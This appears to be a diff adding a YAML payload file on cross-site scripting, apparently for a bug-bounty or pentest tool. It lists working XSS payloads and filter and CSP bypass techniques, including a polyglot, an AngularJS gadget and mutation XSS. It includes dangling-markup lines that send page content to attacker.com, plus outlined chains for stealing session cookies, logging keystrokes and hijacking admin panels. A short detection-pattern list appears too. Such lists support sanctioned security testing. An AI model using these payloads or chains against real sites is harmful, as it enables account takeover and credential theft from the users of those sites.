@@ -1,0 +1,122 @@
+name: Cross-Site Scripting (XSS)
+description: >
+  XSS enables attackers to inject client-side scripts into web pages viewed
+  by other users.
+
+basic_payloads:
+  - "<script>alert(1)</script>"
+  - "<img src=x onerror=alert(1)>"
+  - "<svg onload=alert(1)>"
+  - "javascript:alert(1)"
+  - "\"><script>alert(1)</script>"
+  - "'><script>alert(1)</script>"
+  - "</script><script>alert(1)</script>"
+  - "<ScRiPt>alert(1)</ScRiPt>"
+  - "<img src=x onerror=alert(document.domain)>"
+  - "<body onload=alert(1)>"
+  - "<input autofocus onfocus=alert(1)>"
+  - "<details open ontoggle=alert(1)>"
+  - "<marquee onstart=alert(1)>"
+  - "<video><source onerror=alert(1)>"
+
+bypass_techniques:
+  - name: Tag Obfuscation
+    description: Obfuscate HTML tags to bypass WAF filters
+    payloads:
+      - "<ScRiPt>alert(1)</ScRiPt>"
+      - "<sCrIpT>alert(1)</sCrIpT>"
+      - "<SCRIPT>alert(1)</SCRIPT>"
+
+  - name: Event Handler Substitution
+    description: Replace onerror with other event handlers
+    payloads:
+      - "<img src=x onmouseover=alert(1)>"
+      - "<body onload=alert(1)>"
+      - "<input autofocus onfocus=alert(1)>"
+      - "<details open ontoggle=alert(1)>"
+      - "<svg onload=alert(1)>"
+
+  - name: Unicode Escape
+    description: Encode characters using Unicode escapes
+    payloads:
+      - "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
+      - "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
+
+  - name: Template Literal Bypass (DOM XSS)
+    description: Use JS template literals for DOM-based XSS
+    payloads:
+      - "${alert(1)}"
+      - "`${alert(1)}`"
+      - "alert(document.domain)"
+
+  - name: Polyglot XSS
+    description: Payloads that execute in multiple contexts
+    payloads:
+      - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/( /* */oNcliCk=alert() )//%0D%0A%0D%0A/</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+
+  - name: CSP Bypass - Script Gadgets
+    description: Bypass CSP using whitelisted CDN libraries
+    payloads:
+      - "<script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js>{{$on.constructor('alert(1)')()}}</script>"
+      - "<script src=/path/to/legit.js></script>"
+
+  - name: Mutation XSS (mXSS)
+    description: Exploit browser parser mutations
+    payloads:
+      - "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+
+  - name: Dangling Markup Injection
+    description: Inject unclosed tags to capture content
+    payloads:
+      - "<img src='http://attacker.com/log.php?x='"
+      - "<form action='http://attacker.com/steal.php'><input type='submit'>"
+
+detection_patterns:
+  - "<script>alert"
+  - "onerror=alert"
+  - "onload=alert"
+  - "prompt("
+  - "confirm("
+  - "xss"
+  - "cross-site scripting"
+  - "reflected xss"
+  - "stored xss"
+  - "dom xss"
+
+chain_templates:
+  - name: XSS -> Session Hijack
+    description: Steal session cookies via XSS and hijack user sessions
+    requirements: [xss, httpOnly_cookie_not_set]
+    steps:
+      - Inject XSS payload
+      - Cookie exfiltration via fetch() to attacker server
+      - Replay stolen session cookie
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+  - name: XSS -> Keylogger -> Credential Theft
+    description: Deploy persistent keylogger via stored XSS to steal credentials
+    requirements: [stored_xss, sensitive_pages]
+    steps:
+      - Find stored XSS entry point
+      - Inject keylogger JavaScript
+      - Harvest keystrokes from victim
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+  - name: Blind XSS -> Admin Panel Access
+    description: Use blind XSS against admin panels for privilege escalation
+    requirements: [xss, admin_endpoint]
+    steps:
+      - Inject XSS payload with callback URL
+      - Wait for admin to trigger
+      - Extract CSRF tokens or perform actions as admin
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+h1_references:
+  - report_id: "XXXXX"
+    title: "Stored XSS in profile field"
+    technique: "Stored XSS via unvalidated input"
+    severity: "high"
+  - report_id: "XXXXX"
+    title: "DOM XSS via postMessage"
+    technique: "DOM-based XSS"
+    severity: "medium"
